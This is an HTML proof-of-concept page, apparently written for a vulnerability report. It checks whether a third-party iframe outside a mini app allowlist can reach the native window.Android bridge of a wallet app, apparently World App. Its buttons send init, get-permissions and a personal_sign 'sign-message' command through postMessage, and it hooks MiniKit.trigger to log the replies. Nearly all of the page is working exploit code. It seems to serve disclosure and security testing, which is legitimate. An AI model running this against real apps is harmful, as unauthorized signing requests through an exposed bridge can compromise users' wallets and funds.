<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font:12px/1.35 -apple-system,system-ui,sans-serif;background:#1a1000;color:#ffd9a0;padding:8px;margin:0}
b{color:#7CFC00}.box{border:1px solid #653;border-radius:6px;padding:6px;margin:5px 0;word-break:break-all}
button{background:#a16207;color:#fff;border:0;border-radius:6px;padding:8px;margin:2px;font-size:11px}
pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:5px;border-radius:5px;max-height:150px;overflow:auto}</style>
<div class="box"><b>THIRD-PARTY IFRAME</b> (origin NOT on the mini app allowlist)</div>
<div class="box">iframe origin: <b id="o"></b></div>
<div class="box">window.Android in this frame: <b id="a"></b></div>
<div class="box">window.WorldApp in this frame: <b id="w"></b></div>
<div id="b"></div>
<div class="box">log:<pre id="l"></pre></div>
<script>
const $=i=>document.getElementById(i);
$('o').textContent=location.origin;
$('a').textContent=typeof window.Android;
$('w').textContent=typeof window.WorldApp;
const L=s=>{$('l').textContent=(new Date().toISOString().slice(11,19)+' '+s+'\n')+$('l').textContent;};
window.MiniKit={trigger:(e,p)=>L('<< '+e+' '+JSON.stringify(p).slice(0,900))};
function raw(o){const m=JSON.stringify(o);L('>> '+m.slice(0,180));try{window.Android.postMessage(m);}catch(e){L('ERR '+e);}}
[['init',{command:'init',payload:{version:1,minorVersion:0}}],
 ['get-permissions',{command:'get-permissions',version:1,payload:{}}],
 ['sign-message',{command:'sign-message',version:1,payload:{message:'PoC: personal_sign from a THIRD-PARTY IFRAME at '+location.host}}]
].forEach(c=>{const b=document.createElement('button');b.textContent=c[0];b.onclick=()=>raw(c[1]);$('b').appendChild(b);});
</script>
